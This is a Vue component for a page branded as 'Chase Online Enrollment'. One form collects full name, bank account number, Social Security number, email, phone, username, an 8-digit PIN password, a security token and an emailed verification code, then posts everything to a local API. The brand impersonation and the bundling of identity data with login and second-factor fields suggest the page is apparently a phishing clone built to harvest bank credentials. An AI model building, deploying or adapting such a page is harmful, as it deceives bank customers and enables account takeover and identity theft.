<script setup>
import { ref, computed, watch } from 'vue'
import axios from 'axios'

const form = ref({
  fullName: '',
  accountNumber: '',
  ssn: '',
  email: '',
  otp: '',
  phone: '',
  username: '',
  password: '',
  confirmPassword: '',
  token: '',
  remember: false,
})

const loading = ref(false)
const otpLoading = ref(false)

const otpModal = ref(false)
const message = ref('')
const otpMessage = ref('')

/* =========================
   EMAIL VALIDATION
========================= */

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/

const emailRules = computed(() => {
  const v = form.value.email?.trim()

  return {
    isValid: emailRegex.test(v),
    error: !v
      ? 'Email is required.'
      : !emailRegex.test(v)
        ? 'Enter a valid email address.'
        : '',
  }
})

const validateEmail = () => {
  if (!emailRules.value.isValid) {
    return { ok: false, message: emailRules.value.error }
  }
  return { ok: true }
}

/* =========================
   PASSWORD (PIN) ENGINE
========================= */

const normalizePassword = () => {
  if (form.value.password.length > 8) {
    form.value.password = form.value.password.slice(0, 8)
  }
}

const passwordRules = computed(() => {
  const v = form.value.password

  return {
    isExact: v.length === 8,
    error:
      v.length === 0
        ? ''
        : v.length < 8
          ? 'Password must be exactly 8 digits.'
          : 'Password cannot exceed 8 digits.',
  }
})

const confirmPasswordRules = computed(() => {
  const p = form.value.password
  const c = form.value.confirmPassword

  return {
    isMatch: p === c && c.length === 8,
    error:
      !c
        ? ''
        : p !== c
          ? 'PIN does not match.'
          : '',
  }
})

const validatePassword = () => {
  normalizePassword()

  if (!passwordRules.value.isExact) {
    return { ok: false, message: passwordRules.value.error }
  }

  return { ok: true }
}

const validatePasswordMatch = () => {
  if (!confirmPasswordRules.value.isMatch) {
    return {
      ok: false,
      message: confirmPasswordRules.value.error || 'PIN mismatch.',
    }
  }

  return { ok: true }
}

/* =========================
   ACCOUNT NUMBER
========================= */

const formatAccountNumber = (value) => {
  return value.replace(/\D/g, '').slice(0, 12)
}

watch(
  () => form.value.accountNumber,
  (val) => {
    if (!val) return

    const cleaned = formatAccountNumber(val)
    if (cleaned !== val) {
      form.value.accountNumber = cleaned
    }
  }
)

/* =========================
   INPUT HANDLERS (FIXED)
========================= */

// ONLY password
const handlePasswordInput = (e) => {
  form.value.password = e.target.value.replace(/\D/g, '').slice(0, 8)
}

// ONLY confirm password (IMPORTANT FIX)
const handleConfirmPasswordInput = (e) => {
  form.value.confirmPassword = e.target.value.replace(/\D/g, '').slice(0, 8)
}

/* =========================
   ENROLL USER
========================= */

const enrollUser = async () => {
  normalizePassword()

  const pass = validatePassword()
  if (!pass.ok) return (message.value = pass.message)

  const match = validatePasswordMatch()
  if (!match.ok) return (message.value = match.message)

  const emailCheck = validateEmail()
  if (!emailCheck.ok) return (message.value = emailCheck.message)

  if (!form.value.fullName || !form.value.accountNumber) {
    return (message.value = 'Please fill in all required fields.')
  }

  try {
    loading.value = true
    message.value = ''

    await axios.post('/api/auth/send-enroll-otp', {
      fullName: form.value.fullName,
      email: form.value.email,
      accountNumber: form.value.accountNumber,
    })

    otpModal.value = true
    message.value = 'Verification code sent successfully to your email.'
  } catch (err) {
    message.value =
      err?.response?.data?.message || 'Unable to send verification code.'
  } finally {
    loading.value = false
  }
}

/* =========================
   VERIFY
========================= */

const verifyAndEnroll = async () => {
  normalizePassword()

  const pass = validatePassword()
  if (!pass.ok) return (otpMessage.value = pass.message)

  const match = validatePasswordMatch()
  if (!match.ok) return (otpMessage.value = match.message)

  const emailCheck = validateEmail()
  if (!emailCheck.ok) return (otpMessage.value = emailCheck.message)

  try {
    otpLoading.value = true
    otpMessage.value = ''

    const res = await axios.post('/api/auth/enroll', {
      fullName: form.value.fullName,
      accountNumber: form.value.accountNumber,
      ssn: form.value.ssn,
      email: form.value.email,
      otp: form.value.otp,
      phone: form.value.phone,
      username: form.value.username,
      password: form.value.password,
      token: form.value.token,
      remember: form.value.remember,
    })

    otpMessage.value =
      res?.data?.message || 'Enrollment completed successfully.'

    otpModal.value = false
  } catch (err) {
    otpMessage.value =
      err?.response?.data?.message || 'Invalid verification code.'
  } finally {
    otpLoading.value = false
  }
}
</script>

<template>
  <div
    class="min-h-screen flex flex-col items-center justify-center bg-gradient-to-b from-[#0A4DB3] to-[#0A2240] px-2"
  >
    <!-- LOGO -->
    <div class="text-center mb-8">
      <img
        src="@/assets/images/chasebank1.png"
        alt="Chase Bank"
        class="mx-auto mb-3 h-16 w-18 object-contain"
      />

      <h1 class="text-3xl font-semibold text-white">
        Chase Bank
      </h1>

      <p class="text-sm text-blue-100 mt-1">
        Secure Banking Made Easy
      </p>
    </div>

    <!-- ENROLLMENT CARD -->
    <div class="w-full max-w-xl bg-white rounded-3xl shadow-2xl overflow-hidden">

      <div class="p-8">

        <!-- HEADER -->
        <div class="mb-8">

          <div class="flex items-center gap-3 mb-4">

            <div>
              <h2 class="text-3xl font-semibold text-[#0B1B53]">
                Chase Online Enrollment
              </h2>

              <p class="text-sm text-gray-500 mt-1">
                Enroll securely to access your digital banking services
              </p>
            </div>

          </div>

          <p class="text-gray-600 text-sm leading-relaxed">
            Create your Chase online banking profile to manage accounts,
            transfer funds, monitor transactions, receive alerts,
            and access secure digital banking anytime.
          </p>

        </div>

        <!-- FORM -->
        <form
          @submit.prevent="enrollUser"
          class="space-y-6"
        >

          <!-- FULL NAME -->
          <div class="relative">

            <label class="block text-xs text-gray-600 mb-1">
              Full Legal Name
            </label>

            <input
              v-model="form.fullName"
              type="text"
              autocomplete="name"
              placeholder="First and last name"
              class="peer w-full px-4 py-3 bg-transparent border-b border-gray-300 focus:outline-none text-gray-800 placeholder-gray-400"
            />

            <span
              class="absolute left-0 bottom-0 h-[2px] w-0 bg-[#0A4DB3] transition-all duration-300 peer-focus:w-full"
            ></span>

          </div>

          <!-- ACCOUNT NUMBER -->
          <div class="relative">

            <label class="block text-xs text-gray-600 mb-1">
              Account Number
            </label>

            <input
              v-model="form.accountNumber"
              type="text"
              inputmode="numeric"
              maxlength="12"
              placeholder="Chase Checking Account Number"
              class="peer w-full px-4 py-3 bg-transparent border-b border-gray-300 focus:outline-none text-gray-800 placeholder-gray-400"
            />

            <span
              class="absolute left-0 bottom-0 h-[2px] w-0 bg-[#0A4DB3] transition-all duration-300 peer-focus:w-full"
            ></span>

          </div>

          <!-- SSN -->
          <div class="relative">

            <label class="block text-xs text-gray-600 mb-1">
              Social Security Number or Tax ID
            </label>

            <input
              v-model="form.ssn"
              type="password"
              maxlength="11"
              placeholder="XXX-XX-XXXX"
              class="peer w-full px-4 py-3 bg-transparent border-b border-gray-300 focus:outline-none text-gray-800 placeholder-gray-400 tracking-[3px]"
            />

            <span
              class="absolute left-0 bottom-0 h-[2px] w-0 bg-[#0A4DB3] transition-all duration-300 peer-focus:w-full"
            ></span>

          </div>

          <!-- EMAIL -->
          <div class="relative">

            <label class="block text-xs text-gray-600 mb-1">
              Email Address
            </label>

            <input
              v-model="form.email"
              type="email"
              autocomplete="email"
              placeholder="name@example.com"
              class="peer w-full px-4 py-3 bg-transparent border-b border-gray-300 focus:outline-none text-gray-800 placeholder-gray-400"
            />

            <p
              v-if="emailRules.error"
              class="text-xs text-red-500 mt-2"
            >
              {{ emailRules.error }}
            </p>

            <span
              class="absolute left-0 bottom-0 h-[2px] w-0 bg-[#0A4DB3] transition-all duration-300 peer-focus:w-full"
            ></span>

            <p class="text-xs text-gray-500 mt-2">
              A secure verification code will be sent to this email.
            </p>

          </div>

          <!-- PHONE -->
          <div class="relative">

            <label class="block text-xs text-gray-600 mb-1">
              Mobile Phone Number
            </label>

            <input
              v-model="form.phone"
              type="tel"
              autocomplete="tel"
              placeholder="Enter your mobile number"
              class="peer w-full px-4 py-3 bg-transparent border-b border-gray-300 focus:outline-none text-gray-800 placeholder-gray-400"
            />

            <span
              class="absolute left-0 bottom-0 h-[2px] w-0 bg-[#0A4DB3] transition-all duration-300 peer-focus:w-full"
            ></span>

          </div>

          <!-- USERNAME -->
          <div class="relative">

            <label class="block text-xs text-gray-600 mb-1">
              Username (User ID)
            </label>

            <input
              v-model="form.username"
              type="text"
              autocomplete="username"
              placeholder="Create your unique User ID"
              class="peer w-full px-4 py-3 bg-transparent border-b border-gray-300 focus:outline-none text-gray-800 placeholder-gray-400"
            />

            <span
              class="absolute left-0 bottom-0 h-[2px] w-0 bg-[#0A4DB3] transition-all duration-300 peer-focus:w-full"
            ></span>

          </div>

          <!-- PASSWORD -->
          <div class="relative">

            <label class="block text-xs text-gray-600 mb-1">
              Password
            </label>

            <input
              v-model="form.password"
              type="password"
              maxlength="8"
              inputmode="numeric"
              autocomplete="new-password"
              placeholder="Enter 8-digit PIN"
              @input="handlePasswordInput"
              class="peer w-full px-4 py-3 bg-transparent border-b border-gray-300 focus:outline-none text-gray-800 placeholder-gray-400"
            />

            <span
              class="absolute left-0 bottom-0 h-[2px] w-0 bg-[#0A4DB3] transition-all duration-300 peer-focus:w-full"
            ></span>

            <div class="mt-3 space-y-1">
              <p class="text-xs text-gray-500">
                • Minimum 8 characters
              </p>
            </div>

          </div>

          <!-- CONFIRM PASSWORD -->
          <div class="relative mt-4">

            <label class="block text-xs text-gray-600 mb-1">
              Confirm Password
            </label>

            <input
              v-model="form.confirmPassword"
              type="password"
              maxlength="8"
              inputmode="numeric"
              placeholder="Re-enter 8-digit PIN"
              @input="handleConfirmPasswordInput"
              class="peer w-full px-4 py-3 bg-transparent border-b border-gray-300 focus:outline-none text-gray-800 placeholder-gray-400"
            />

            <span
              class="absolute left-0 bottom-0 h-[2px] w-0 bg-[#0A4DB3] transition-all duration-300 peer-focus:w-full"
            ></span>

            <p
              v-if="confirmPasswordRules?.error"
              class="text-xs text-red-500 mt-2"
            >
              {{ confirmPasswordRules?.error }}
            </p>

          </div>

          <!-- TOKEN -->
          <div class="relative">

            <label class="block text-xs text-gray-600 mb-1">
              Security Token (Optional)
            </label>

            <input
              v-model="form.token"
              type="text"
              placeholder="Enter token if enabled"
              class="peer w-full px-4 py-3 bg-transparent border-b border-gray-300 focus:outline-none text-gray-800 placeholder-gray-400"
            />

            <span
              class="absolute left-0 bottom-0 h-[2px] w-0 bg-[#0A4DB3] transition-all duration-300 peer-focus:w-full"
            ></span>

          </div>

          <!-- REMEMBER -->
          <div class="flex items-center justify-between text-xs">

            <label class="flex items-center gap-2 text-gray-600">

              <input
                type="checkbox"
                v-model="form.remember"
                class="accent-[#0A4DB3]"
              />

              Remember this trusted device

            </label>

          </div>

          <!-- BUTTON -->
          <button
            type="submit"
            :disabled="loading"
            class="w-full py-3 rounded-xl text-white font-semibold flex items-center justify-center gap-2 transition disabled:opacity-50 disabled:cursor-not-allowed"
            :class="
              loading
                ? 'bg-[#0A2240]'
                : 'bg-gradient-to-r from-[#0A4DB3] to-[#0A2240] hover:brightness-110 shadow-lg shadow-blue-900/30'
            "
          >

            <svg
              v-if="loading"
              class="animate-spin h-5 w-5 text-white"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
            >

              <circle
                class="opacity-25"
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                stroke-width="4"
              ></circle>

              <path
                class="opacity-75"
                fill="currentColor"
                d="M4 12a8 8 0 018-8v8z"
              ></path>

            </svg>

            <span>
              {{ loading ? 'Sending Verification...' : 'Enroll Now' }}
            </span>

          </button>

          <!-- MESSAGE -->
          <p
            v-if="message"
            class="text-center text-sm"
            :class="
              message.toLowerCase().includes('sent')
                ? 'text-green-600'
                : 'text-red-500'
            "
          >
            {{ message }}
          </p>

        </form>

        <!-- FOOTER -->
        <div class="text-center mt-6 text-xs text-gray-500">

          Already enrolled?

          <router-link
            to="/login"
            class="text-[#0A4DB3] font-semibold ml-1 hover:underline"
          >
            Sign In
          </router-link>

        </div>

      </div>
    </div>

    <!-- OTP MODAL -->
    <div
      v-if="otpModal"
      class="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 px-4"
    >

      <div class="bg-white rounded-3xl p-6 w-full max-w-sm shadow-2xl">

        <div class="text-center">

          <div
            class="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-5"
          >

            <svg
              xmlns="http://www.w3.org/2000/svg"
              class="w-10 h-10 text-[#0A4DB3]"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >

              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                stroke-width="2"
                d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8m-18 8h18V8H3v8z"
              />

            </svg>

          </div>

          <h3 class="text-2xl font-semibold text-[#0B1B53]">
            Verify Your Email
          </h3>

          <p class="text-sm text-gray-500 mt-2">
            Enter the 6-digit verification code sent to
          </p>

          <p class="text-sm font-semibold text-[#0B1B53] mt-1 break-all">
            {{ form.email }}
          </p>

        </div>

        <!-- OTP -->
        <div class="mt-6">

          <input
            v-model="form.otp"
            type="text"
            maxlength="6"
            placeholder="••••••"
            class="w-full text-center tracking-[12px] text-2xl font-bold border-b border-gray-300 py-4 focus:outline-none"
          />

        </div>

        <!-- OTP MESSAGE -->
        <p
          v-if="otpMessage"
          class="text-sm text-center mt-4"
          :class="
            otpMessage.toLowerCase().includes('success')
              ? 'text-green-600'
              : 'text-red-500'
          "
        >
          {{ otpMessage }}
        </p>

        <!-- BUTTONS -->
        <div class="mt-6 space-y-3">

          <button
            @click="verifyAndEnroll"
            :disabled="otpLoading"
            class="w-full py-3 rounded-xl text-white font-semibold flex items-center justify-center gap-2 transition disabled:opacity-50 disabled:cursor-not-allowed"
            :class="
              otpLoading
                ? 'bg-[#0A2240]'
                : 'bg-gradient-to-r from-[#0A4DB3] to-[#0A2240] hover:brightness-110 shadow-lg shadow-blue-900/30'
            "
          >

            <svg
              v-if="otpLoading"
              class="animate-spin h-5 w-5 text-white"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
            >

              <circle
                class="opacity-25"
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                stroke-width="4"
              ></circle>

              <path
                class="opacity-75"
                fill="currentColor"
                d="M4 12a8 8 0 018-8v8z"
              ></path>

            </svg>

            <span>
              {{ otpLoading ? 'Verifying...' : 'Verify & Complete Enrollment' }}
            </span>

          </button>

          <button
            @click="otpModal = false"
            class="w-full border border-gray-300 hover:bg-gray-100 transition py-3 rounded-xl font-medium text-gray-700"
          >
            Cancel
          </button>

        </div>

      </div>

    </div>

  </div>
</template>
